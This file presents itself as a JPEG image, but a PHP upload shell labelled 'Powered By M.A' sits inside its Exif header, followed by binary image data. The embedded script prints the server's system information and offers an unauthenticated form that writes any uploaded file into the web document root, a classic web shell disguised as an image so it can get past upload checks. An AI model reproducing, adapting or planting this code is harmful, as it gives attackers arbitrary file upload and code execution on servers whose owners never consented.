����tExif  MM *       0   4        �i      d      <title>M.A </title>
<?php
echo "Powered By M.A<br>";
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='idx_file'>
<input type='submit' name='upload' value='upload'>
</form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
if(is_writable($root)) {
if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
$web = "http://".$_SERVER['HTTP_HOST']."/";
echo "sukses..!! -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
} else {
echo "failed to upload in the document root.";
}
} else {
if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
echo "sukses upload <b>$files</b> di folder ini";
} else {
echo "gagal upload";
}
}
}
?>         �� JFIF      �� C 


�� C		��  T T" ��              	�� I        !1AQRU��	"7SWaqu����5Tb����#23B�t������             �� 0 	        QR��1ASq�����34a�b��   ? �1��l���ܞ�"äFD��J[T�|WLɷd�Fy�`df�Df�K8Ԓ=X�#�Ҽ1�%r�4�����1����B��*}$e�t��Ґ��;B�
������r�r��.����b��ɶ���%�67��yT������h<��_8��M��zRXGh4��Ґ��;B���{ʥ��c��o{^�{u�� $��G��w�h���Ґ��;A�t�������k�Uo^��{���[׬�� ����>��;��J�r�%�m��WV|	C�3?x�
$��o�2�]�QAg5��yP�>$8�����1#Ą���+eB̏.Ls�-
v<���^�ʉ6J=f��
N8�����C-1��`�|ڻd��D�0  	��ݙ�ᓗ��k�P��h8A)����f�Z���?��ы,8^����J�BOw5�p(�;��cH��*��]��i_����X��T�����H��&���x���n��%dJY�K�g�WFj��Q�-I�C~a����bI�����GD?��E�A�l�"S����$��
Ն�)��c��2�e[�G��,y�(��X)F����$e��Rg��m�{@4]�Be]ڤy�J�L�����V�e�p�W��c����Jq�	M��RU�Y�d������,��~(�bҦ,�W��R�;Ja�� 4����͸6�өI�8���V�<a��o�����_�G�Ȥ��þu��&P�Je+[�e�.�<�� Gv����^؉�>��՝�*XӘ�\k��H2ete~�kqP�
bxߕ���D���x��AT^����DmJ���"eF���T�	&�,�R�dx����c$��ܧ��s�!�V/�̣lh���5Zz)��l�_cm�iVb��bY���Ak�Ϋ˯\6������Ǟ����h�F%�(�#��x}�Bj����q0�$���rd������$���5�p�bA��zx<s֓�N ��R�y�<V�j??�>秃�=i;��^.��Cm�TѸ�o�  ��tW����� ��y}��ދpE��R�JZ�-I�ՇT�B�6����"�����J��	7{jO>W�`7����~av��f�J���+�H_�� �	{jO>W�`اd┚�E��O��.yy��F�zn���?���/^��C�+.6~Y/y..A8�bJ՚�"��|�7plϾ���������zx<s֓�N Rw����~avKa%=����B��Y퇉�h�\�ao��:��hIP����M  �Z�e��X�-ÑD�u�&[	y� �4�=Y���Ivj�����LVf��_i4��HYbG�	����$oH\=��-=j�&_U
|�#J��E�ڍ+e�Z��4���N��:�i_���pTz�-Ĕ�p���ƈA�z��pu���U������t3�Ҿ͌��a������ឭx7�-�D �ٽqψ!���|@��{.>��� t�~�I�M�� &��k�,�.ˮ�[;}ȧP�䝧mR����7��\�h�7�9�D �ٽqψ)#ONK���� ��}4�>N
��W�Z�=�T�fmBc�$�*V�>B"@���v-Fҳ�&��#��+�m�q-���E�Y�mfZ��DFxb%4�T�Ėr^A�4;)�$��Y���e�㴖�B[m%�R�����!�č[tG}�pR�N�7+� L�@  !   �    @  !   ���